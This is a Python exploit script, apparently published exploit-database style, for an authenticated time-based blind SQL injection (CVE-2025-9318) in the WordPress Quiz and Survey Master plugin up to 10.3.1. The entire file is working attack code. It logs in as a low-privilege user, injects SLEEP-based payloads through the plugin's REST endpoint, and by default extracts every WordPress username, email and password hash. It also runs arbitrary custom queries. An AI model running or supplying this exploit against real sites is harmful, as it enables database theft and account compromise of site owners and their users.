# Exploit Title: WordPress Quiz and Survey Master <= 10.3.1 - Authenticated SQL Injection
# Date: 2026-01-11
# Exploit Author: Rahul Sreenivasan (Tr0j4n)
# Vendor Homepage: https://quizandsurveymaster.com/
# Software Link: https://wordpress.org/plugins/quiz-master-next/
# Version: <= 10.3.1
# Tested on: WordPress 6.x with QSM 10.3.1 on Ubuntu/Docker/MySQL
# CVE: CVE-2025-9318

from argparse import ArgumentParser
from requests import Session
from requests.packages.urllib3 import disable_warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from time import time
from sys import exit
from urllib.parse import quote
import re

disable_warnings(InsecureRequestWarning)

def login(url, username, password):
    session = Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    login_url = f"{url.rstrip('/')}/wp-login.php"
    
    try:
        session.get(login_url, verify=False, timeout=10)
        data = {"log": username, "pwd": password, "wp-submit": "Log In"}
        session.post(login_url, data=data, verify=False, timeout=10, allow_redirects=True)
        
        # Get REST API nonce
        response = session.get(f"{url.rstrip('/')}/wp-admin/", verify=False, timeout=10)
        
        # Try multiple nonce patterns
        match = re.search(r'wpApiSettings\s*=\s*{[^}]*"nonce"\s*:\s*"([^"]+)"', response.text)
        if not match:
            match = re.search(r'"nonce":"([a-f0-9]+)"', response.text)
        
        if match:
            session.headers.update({"X-WP-Nonce": match.group(1)})
        
        return session
    except:
        pass
    
    return None

def check_questions_exist(session, url, timeout):
    for qid in range(1, 11):
        try:
            test_url = f"{url.rstrip('/')}/wp-json/quiz-survey-master/v1/questions/{qid}?is_linking=1"
            response = session.get(test_url, verify=False, timeout=timeout)
            
            if response.status_code == 200:
                data = response.json()

                if isinstance(data, dict) and data.get('status') != 'error':
                    if 'id' in data or 'quizID' in data:
                        return True, qid
        except:
            continue
    
    return False, None

def send_payload(session, url, question_id, payload, timeout):
    encoded_payload = quote(payload, safe='')
    target = f"{url.rstrip('/')}/wp-json/quiz-survey-master/v1/questions/{question_id}?is_linking={encoded_payload}"
    
    try:
        start = time()
        session.get(target, verify=False, timeout=timeout)
        return time() - start
    except KeyboardInterrupt:
        raise
    except:
        return timeout

def check_vulnerable(session, url, question_id, sleep_time, timeout):
    
    payload = f"1) OR SLEEP({sleep_time})-- "
    injection = send_payload(session, url, question_id, payload, timeout)
    
    if injection >= sleep_time * 0.7:
        print("[+] Target is VULNERABLE!")
        return True
    else:
        print("[-] Target does not appear to be vulnerable.")
        return False

def extract_length(session, url, question_id, query, timeout):
    low, high = 1, 100
    
    try:
        while low < high:
            mid = (low + high) // 2
            payload = f"1) OR IF(LENGTH(({query}))>{mid},SLEEP(0.15),0)-- "
            elapsed = send_payload(session, url, question_id, payload, timeout)
            
            if elapsed >= 0.12:
                low = mid + 1
            else:
                high = mid
    except KeyboardInterrupt:
        raise
    
    return low

def extract_char(session, url, question_id, query, position, timeout):
    low, high = 32, 126
    
    try:
        while low < high:
            mid = (low + high) // 2
            payload = f"1) OR IF(ASCII(SUBSTRING(({query}),{position},1))>{mid},SLEEP(0.15),0)-- "
            elapsed = send_payload(session, url, question_id, payload, timeout)
            
            if elapsed >= 0.12:
                low = mid + 1
            else:
                high = mid
    except KeyboardInterrupt:
        raise
    
    return chr(low) if low <= 126 else "?"

def extract_data(session, url, question_id, query, timeout):
    length = extract_length(session, url, question_id, query, timeout)
    print(f"[*] Data length: {length}")
    
    result = ""
    try:
        for i in range(1, length + 1):
            char = extract_char(session, url, question_id, query, i, timeout)
            result += char
            print(f"\r[*] Extracting: {result}", end="", flush=True)
    except KeyboardInterrupt:
        print(f"\n[!] Interrupted. Partial result: {result}")
        raise
    
    print()
    return result

def dump_users(session, url, question_id, timeout):
    print("\n[*] Extracting WordPress users...")
    
    # Get user count
    query = "SELECT COUNT(*) FROM wp_users"
    count_str = extract_data(session, url, question_id, query, timeout)
    user_count = int(count_str)
    print(f"[+] Found {user_count} users\n")
    
    users = []
    for user_id in range(1, user_count + 1):
        print(f"[*] Extracting user {user_id}/{user_count}...")
        
        query = f"SELECT user_login FROM wp_users WHERE ID={user_id}"
        username = extract_data(session, url, question_id, query, timeout)
        
        query = f"SELECT user_email FROM wp_users WHERE ID={user_id}"
        email = extract_data(session, url, question_id, query, timeout)
        
        query = f"SELECT user_pass FROM wp_users WHERE ID={user_id}"
        password = extract_data(session, url, question_id, query, timeout)
        
        print(f"[+] User {user_id}:")
        print(f"    Username: {username}")
        print(f"    Email: {email}")
        print(f"    Hash: {password}")
        print()
        
        users.append({"username": username, "email": email, "hash": password})
    
    return users

def main():
    parser = ArgumentParser(description="WordPress QSM SQLi Exploit (CVE-2025-9318)")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress URL")
    parser.add_argument("-U", "--username", default="subscriber", help="WordPress username")
    parser.add_argument("-P", "--password", default="subscriber@123", help="WordPress password")
    parser.add_argument("-q", "--question-id", type=int, help="Question ID")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="Request timeout")
    parser.add_argument("--check", action="store_true", help="Only check vulnerability")
    parser.add_argument("--dump", action="store_true", help="Dump admin credentials")
    parser.add_argument("--query", help="Custom SQL query to extract")
    args = parser.parse_args()
    
    try:
        print("[+] WordPress Quiz and Survey Master SQLi Exploit (CVE-2025-9318)")
        print(f"[+] Target: {args.url}")
        
        # Login
        print(f"[*] Logging in as '{args.username}'...")
        session = login(args.url, args.username, args.password)
        
        if not session:
            print("[-] Login failed.")
            exit(1)
        
        print("[+] Login successful!")
        
        # Get question ID
        if not args.question_id:
            print("[*] Checking for questions...")
            exists, question_id = check_questions_exist(session, args.url, args.timeout)
            
            if not exists:
                print("[-] No questions found. This exploit requires at least one question.")
                exit(1)
            
            print(f"[+] Found question ID: {question_id}")
        else:
            question_id = args.question_id
        
        if not check_vulnerable(session, args.url, question_id, 2, args.timeout):
            exit(1)
        
        if args.check:
            exit(0)
        
        # Exploitation
        if args.dump:
            dump_users(session, args.url, question_id, args.timeout)
        elif args.query:
            print(f"\n[*] Executing query: {args.query}")
            result = extract_data(session, args.url, question_id, args.query, args.timeout)
            print(f"[+] Result: {result}")
        else:
            dump_users(session, args.url, question_id, args.timeout)
    
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting...")
        exit(0)

if __name__ == "__main__":
    main()
